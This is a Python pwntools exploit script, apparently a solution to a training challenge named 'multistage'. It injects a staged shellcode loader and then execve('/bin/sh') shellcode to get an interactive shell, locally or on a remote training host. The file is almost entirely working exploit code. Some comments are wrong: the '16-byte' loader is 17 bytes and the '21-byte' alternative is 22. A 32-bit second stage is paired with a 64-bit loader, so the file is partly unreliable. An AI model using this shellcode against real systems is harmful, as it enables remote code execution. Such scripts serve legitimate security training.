from pwn import *

COMMANDS = """
xuntil 0x40123f
"""

# First stage: 16-byte loader that reads more shellcode from stdin
stage1 = b"\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x66\xba\x00\x10\x0f\x05\xff\xe6"

# Second stage: execve("/bin/sh", 0, 0) shellcode (23 bytes)
stage2 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Alternative second stage (21 bytes) if you prefer:
# stage2 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05"

if args.GDB:
    p = gdb.debug("./multistage", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./multistage")

# Send first stage loader (exactly 16 bytes)
p.send(stage1)

# Send second stage execve shellcode
p.send(stage2)

p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f

